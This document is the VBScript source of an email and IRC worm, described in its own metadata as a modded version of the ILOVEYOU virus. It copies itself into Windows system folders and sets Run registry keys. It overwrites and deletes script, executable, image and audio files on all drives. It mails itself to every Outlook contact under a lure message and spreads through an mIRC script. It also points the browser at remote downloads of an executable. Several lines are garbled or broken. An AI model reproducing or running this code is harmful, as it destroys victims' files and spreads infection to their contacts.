Rem  master7720 - hydra_letter(vbe) < cool things > 
Rem by
master7720 / master7720@mail.com / @imperial Group / LA
On Error Resume Next
Dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq = ""
ctr = 0
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy = file.ReadAll
main()
Sub main()
    On Error Resume Next
    Dim wscr,rr
    Set wscr = CreateObject("WScript.Shell")
    rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
    If (rr >= 1) Then
        wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
    End If
    Set dirwin = fso.GetSpecialFolder(0)
    Set dirsystem = fso.GetSpecialFolder(1)
    Set dirtemp = fso.GetSpecialFolder(2)
    Set c = fso.GetFile(WScript.ScriptFullName)
    c.Copy(dirsystem & "\MSKernel32.vbs")
    c.Copy(dirwin & "\Win32DLL.vbs")
    c.Copy(dirsystem & "\HYDRA-SENT-YOU-A-LETTER.TXT.vbs")
    regruns()
    html()
    spreadtoemail()
    listadriv()
End Sub
Sub regruns()
    On Error Resume Next
    Dim num,downread
    regcreate
    "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKern el32",dirsystem & "\MSKernel32.vbs"
    regcreate
    "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunService s\Win32DLL",dirwin & "\Win32DLL.vbs"
    downread = ""
    downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
    If (downread = "") Then
        downread = "c:\"
    End If
    If (fileexist(dirsystem & "\WinFAT32.exe") = 1) Then
        Randomize
        num = Int((4 * Rnd) + 1)
        If num = 1 Then
            regcreate "HKCU \ Software \ Microsoft \ Internet Explorer \ Main \ Start
            Page","http
             /  / www.skyinet.net / ~young1s / HJKhjnwerhjkxcvytwertnMTFwetrdsfm
            hPnjw6587345gvsdf7679njbvYT / WIN - BUGSFIX.exe"
        ElseIf num = 2 Then
            regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http
             /  / www.skyinet.net / ~angelcat / skladjflfdjghKJnwetryDGFikjUIyqw
            erWe546786324hjk4jnHHGbvbmKLJKjhkqj4w / WIN - BUGSFIX.exe"
        ElseIf num = 3 Then
            regcreate "HKCU \ Software \ Microsoft \ Internet Explorer \ Main \ Start
            Page","http
             /  / www.skyinet.net / ~koichi / jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBd
            QZnmPOhfgER67b3Vbvg / WIN - BUGSFIX.exe"
        ElseIf num = 4 Then
            regcreate "HKCU \ Software \ Microsoft \ Internet Explorer \ Main \ Start
            Page","http
             /  / www.skyinet.net / ~chu / sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSD
            GjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg / WIN - BUGSFIX.exe"
        End If
    End If
    If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then regcreate
    "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BU GSFIX",downread & "\WIN-BUGSFIX.exe"
    regcreate "HKEY_CURRENT_USER \ Software \ Microsoft \ Internet
    Explorer \ Main \ Start Page","about
    blank"
End If
End Sub
Sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d In dc
    If d.DriveType = 2 Or d.DriveType = 3 Then
        folderlist(d.path & "\")
    End If
Next
listadriv = s
End Sub
Sub infectfiles(folderspec)
On Error Resume Next
Dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
    ext = fso.GetExtensionName(f1.path)
    ext = LCase(ext)
    s = LCase(f1.name)
    If (ext = "vbs") Or (ext = "vbe") Then
        Set ap = fso.OpenTextFile(f1.path,2,True)
        ap.write vbscopy
        ap.close
    ElseIf(ext = "exe") Or (ext = "com") Or (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Then
        Set ap = fso.OpenTextFile(f1.path,2,True)
        ap.write vbscopy
        ap.close
        bname = fso.GetBaseName(f1.path)
        Set cop = fso.GetFile(f1.path)
        cop.copy(folderspec & "\" & bname & ".vbs") fso.DeleteFile(f1.path)
    ElseIf(ext = "jpg") Or (ext = "jpeg") Then
        Set ap = fso.OpenTextFile(f1.path,2,True)
        ap.write vbscopy
        ap.close
        Set cop = fso.GetFile(f1.path)
        cop.copy(f1.path & ".vbs")
        fso.DeleteFile(f1.path)
    ElseIf(ext = "mp3") Or (ext = "mp2") Then
        Set mp3 = fso.CreateTextFile(f1.path & ".vbs")
        mp3.write vbscopy
        mp3.close
        Set att = fso.GetFile(f1.path)
        att.attributes = att.attributes + 2
    End If
    If (eq <> folderspec) Then
        If (s = "mirc32.exe") Or (s = "mlink32.exe") Or (s = "mirc.ini") Or (s = "script.ini") Or (s = "mirc.hlp") Then
            Set scriptini = fso.CreateTextFile(folderspec & "\script.ini") scriptini.WriteLine "[script]"
            scriptini.WriteLine ";mIRC Script"
            scriptini.WriteLine ";  Please dont edit this script unless you know what your doing mirc will corrupt"
            scriptini.WriteLine ";  corrupted windows will affect and will not run correctly"
            scriptini.WriteLine ";"
            scriptini.WriteLine ";Khaled Mardam-Bey"
            scriptini.WriteLine ";http://www.mirc.com"
            scriptini.WriteLine ";"
            scriptini.WriteLine "n0=on 1:JOIN:#:{"
            scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }" scriptini.WriteLine "n2 =  / .dcc send $nick
            "&dirsystem&" \ HYDRA - SENT - YOU - A - LETTER.HTM"
            scriptini.WriteLine "n3=}"
            scriptini.close
            eq = folderspec
        End If
    End If
Next
End Sub
Sub folderlist(folderspec)
On Error Resume Next
Dim f,f1,sf
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
    infectfiles(f1.path)
    folderlist(f1.path)
Next
End Sub
Sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
End Sub
Function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget = regedit.RegRead(value)
End Function
Function fileexist(filespec)
On Error Resume Next
Dim msg
If (fso.FileExists(filespec)) Then
    msg = 0
Else
    msg = 1
End If
fileexist = msg
End Function
Function folderexist(folderspec)
On Error Resume Next
Dim msg
If (fso.GetFolderExists(folderspec)) Then
    msg = 0
Else
    msg = 1
End If
fileexist = msg
End Function
Sub spreadtoemail()
On Error Resume Next
Dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
Set regedit = CreateObject("WScript.Shell")
Set out = WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
For ctrlists = 1 To mapi.AddressLists.Count
    Set a = mapi.AddressLists(ctrlists)
    x = 1
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a) If (regv = "") Then
    regv = 1
End If
If (Int(a.AddressEntries.Count) > Int(regv)) Then
    For ctrentries = 1 To a.AddressEntries.Count
        malead = a.AddressEntries(x)
        regad = ""
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )
        If (regad = "") Then
            Set male = out.CreateItem(0)
            male.Recipients.Add(malead)
            male.Subject = "HYDRA"
            male.Body = vbCrLf & "kindly check the attached file coming from me."
            male.Attachments.Add(dirsystem & "\HYDRA-SENT-YOU-A-LETTER.TXT.vbs") male.Send
            regedit.RegWrite
            "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead,1,"REG_DWORD"End If
            x = x + 1
        Next
        regedit.RegWrite
        "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a,a.AddressEntries.Count Else
        regedit.RegWrite
        "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a,a.AddressEntries.CountEnd If
    Next
    Set out = Nothing
    Set mapi = Nothing
End Sub
Sub html
    On Error Resume Next
    Dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
    dta1 = " < HTML >  < HEAD >  < TITLE > HYDRA_LETTER - HTML < ? - ?TITLE >  < META NAME = @ - @Generator@ - @ CONTENT = @ - @BAROK VBS - 
    HYDRA_LETTER@ - @ > "&vbcrlf& _ " < META NAME = @ - @Author@ - @ CONTENT = @ - @master7720 ? - ? master7720@mail.com ? - ?
    @imperial Group ? - ? LA ? - ? november 2021 - @ > "&vbcrlf& _ " < META NAME = @ - @Description@ - @
    CONTENT = @ - @modded version of a simple virus called ILOVEYOU...@ - @ > " & vbCrLf & _
    " < ? - ?HEAD >  < BODY
    ONMOUSEOUT = @ - @window.name = # - #main# - #;window.open(# - #HYDRA - SENT - YOU - A - LETTER.
    HTM# - #,# - #main# - #)@ - @ " & vbCrLf & _
    "ONKEYDOWN = @ - @window.name = # - #main# - #;window.open(# - #HYDRA - SENT - YOU - A - LETTER. HTM# - #,# - #main# - #)@ - @
    BGPROPERTIES = @ - @fixed@ - @
    BGCOLOR = @ - @#FF9933@ - @ > " & vbCrLf & _
    " < CENTER >  < p > This HTML file need ActiveX Control < ? - ?p >  < p > To Enable To read this HTML file < BR >  - Please press # - #YES# - # button To
    Enable ActiveX < ? - ?p > " & vbCrLf & _
    " < ? - ?CENTER >  < MARQUEE Loop = @ - @infinite@ - @
    BGCOLOR = @ - @yellow@ - @ >  -  -  -  -  -  -  -  -  -  - z -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  - z -  -  -  -  -  -  -  -  -  -  < ? - ?MARQU EE > " & vbCrLf & _
    "<?-?BODY><?-?HTML>" & vbCrLf & _
    "<SCRIPT language=@-@JScript@-@>" & vbCrLf & _ "<!--?-??-?" & vbCrLf & _
    "If (window.screen){var wi = screen.availWidth;var
    hi = screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}" & vbcrl f & _
    "?-??-?-->" & vbCrLf & _
    "<?-?SCRIPT>" & vbCrLf & _
    "<SCRIPT LANGUAGE=@-@VBScript@-@>" & vbCrLf & _ "<!--" & vbCrLf & _
    "on error resume next" & vbCrLf & _
    "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit" & vbCrLf & _ "aw=1" & vbCrLf & _
    "code="
    dta2 = "set fso=CreateObject(@-@Scripting.FileSystemObject@-@)" & vbCrLf & _
    "set dirsystem=fso.GetSpecialFolder(1)" & vbCrLf & _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))" & vbCrLf & _
    "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))" & vbCrLf & _ "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))" & vbCrLf & _ "Set
    wri = fso.CreateTextFile(dirsystem & @ - @ ^  -  ^ MSKernel32.vbs@ - @)" & vbCrLf & _
    "wri.write code4" & vbCrLf & _
    "wri.close" & vbCrLf & _
    "if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then" & vbCrLf & _ "if (err.number=424) then" & vbCrLf & _
    "aw=0" & vbCrLf & _
    "end if" & vbCrLf & _
    "if (aw=1) then" & vbCrLf & _
    "document.write @-@ERROR: can#-#t initialize ActiveX@-@" & vbCrLf & _ "window.close" & vbCrLf & _
    "end if" & vbCrLf & _
    "end if" & vbCrLf & _
    "Set regedit = CreateObject(@-@WScript.Shell@-@)" & vbCrLf & _
    "regedit.RegWrite
    @ - @HKEY_LOCAL_MACHINE ^  -  ^ Software ^  -  ^ Microsoft ^  -  ^ Windows ^  -  ^ CurrentVersion ^ 
     -  ^ Run ^  -  ^ MSKernel32@ - @,dirsystem & @ - @ ^  -  ^ MSKernel32.vbs@ - @"&vbcrlf& _ "? - ?? - ? -  -  > " & vbCrLf & _
    "<?-?SCRIPT>"
    dt1 = Replace(dta1,Chr(35) & Chr(45) & Chr(35),"'")
    dt1 = Replace(dt1,Chr(64) & Chr(45) & Chr(64),"""") dt4 = Replace(dt1,Chr(63) & Chr(45) & Chr(63),"/")
    dt5 = Replace(dt4,Chr(94) & Chr(45) & Chr(94),"\")
    dt2 = Replace(dta2,Chr(35) & Chr(45) & Chr(35),"'")
    dt2 = Replace(dt2,Chr(64) & Chr(45) & Chr(64),"""") dt3 = Replace(dt2,Chr(63) & Chr(45) & Chr(63),"/")
    dt6 = Replace(dt3,Chr(94) & Chr(45) & Chr(94),"\")
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set c = fso.OpenTextFile(WScript.ScriptFullName,1)
    lines = Split(c.ReadAll,vbCrLf)
    l1 = UBound(lines)
    For n = 0 To UBound(lines)
        lines(n) = Replace(lines(n),"'",Chr(91) + Chr(45) + Chr(91)) lines(n) = Replace(lines(n),"""",Chr(93) + Chr(45) + Chr(93))
        lines(n) = Replace(lines(n),"\",Chr(37) + Chr(45) + Chr(37)) If (l1 = n) Then
        lines(n) = Chr(34) + lines(n) + Chr(34)
    Else
        lines(n) = Chr(34) + lines(n) + Chr(34) & "&vbcrlf& _"End If
    Next
    Set b = fso.CreateTextFile(dirsystem + "\HYDRA-SENT-YOU-A-LETTER.HTM") b.close
    Set d = fso.OpenTextFile(dirsystem + "\HYDRA-SENT-YOU-A-LETTER.HTM",2) d.write dt5
    d.write Join(lines,vbCrLf)
    d.write vbCrLf
    d.write dt6
    d.close
End Sub
